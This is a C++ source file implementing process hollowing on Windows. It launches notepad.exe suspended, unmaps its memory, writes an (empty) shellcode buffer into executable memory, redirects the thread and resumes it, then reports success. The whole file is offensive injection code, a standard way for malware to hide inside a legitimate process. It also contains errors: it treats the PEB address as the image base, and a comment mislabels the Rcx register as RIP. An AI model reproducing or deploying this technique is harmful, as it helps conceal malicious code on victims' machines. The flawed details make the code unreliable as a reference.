#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

unsigned char shellcode[] = {
    
};

SIZE_T shellcodeSize = sizeof(shellcode);

bool CreateSuspendedProcess(const char* targetProcess, PROCESS_INFORMATION& pi, STARTUPINFOA& si) {
    return CreateProcessA(NULL, (LPSTR)targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
}

int main() {
    const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateSuspendedProcess(targetProcess, pi, si)) {
        std::cerr << "Failed to create process. Error: " << GetLastError() << std::endl;
        return -1;
    }

    // Get NtUnmapViewOfSection from ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to get handle to ntdll.dll." << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) {
        std::cerr << "Failed to resolve NtUnmapViewOfSection." << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Get PEB base address
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);


    PVOID baseAddress = (PVOID)pbi.PebBaseAddress;
    std::cout << "PEB Base Address: " << baseAddress << std::endl;

    // Unmap original image from process memory
    if (NtUnmapViewOfSection(pi.hProcess, baseAddress) != 0) {
        std::cerr << "Failed to unmap original process image." << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Allocate memory for shellcode
    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, baseAddress, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        std::cerr << "Memory allocation failed. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Write shellcode into allocated memory
    if (!WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, shellcodeSize, NULL)) {
        std::cerr << "Failed to write shellcode. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Modify thread context to point to shellcode
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Failed to get thread context. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    ctx.Rcx = (DWORD64)remoteMemory;  // Set RIP (Instruction Pointer)
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Failed to set thread context. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return -1;
    }

    // Resume process
    ResumeThread(pi.hThread);

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "Process Hollowing with Shellcode Injection executed successfully." << std::endl;
    return 0;
}
